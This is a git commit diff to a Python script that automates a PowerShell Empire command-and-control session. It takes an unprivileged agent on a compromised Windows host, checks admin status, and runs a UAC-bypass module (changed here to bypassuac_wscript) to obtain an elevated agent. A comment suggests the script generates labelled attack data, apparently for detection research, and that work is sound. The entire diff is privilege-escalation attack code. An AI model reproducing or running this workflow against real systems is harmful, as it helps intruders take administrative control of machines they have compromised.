f4bc454f709ad8927809f1b10e4f6a0b540c2546
jc <jym@jym.sg>
2017-11-07 14:25:42 +0800

    changed to bypassuac_wscript

--- localEoP_procedure_example.py
+++ localEoP_procedure_example.py
@@ -16,6 +16,7 @@ try:
     API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
     # we assume there's a non-privilege agent, some stager was executed before
     agent = empire_wait_for_agent.run(API) # gets first agent since no hostname is given
+    hostname = agent['hostname']
     admin_type = empire_is_user_admin.run(API, agent['name']) 
     # to assist data labelling, we timestamp with reference to target machine
     timestamp = empire_get_timestamp.run(API, agent['name'])
@@ -26,7 +27,7 @@ try:
         agent = empire_wait_for_agent.run(API, hostname, True, 120)
         if agent is not None:
             print('yeay!!! we got an SYSTEM user')
-    empire_bypassUAC.run(API, agent['name'], privesc.bypassuac.path)
+    empire_bypassUAC.run(API, agent['name'], privesc.bypassuac_wscript.path)
     # wait for privileged agent for 120 seconds
     agent = empire_wait_for_agent.run(API, hostname, True, 120)
     if agent is not None:
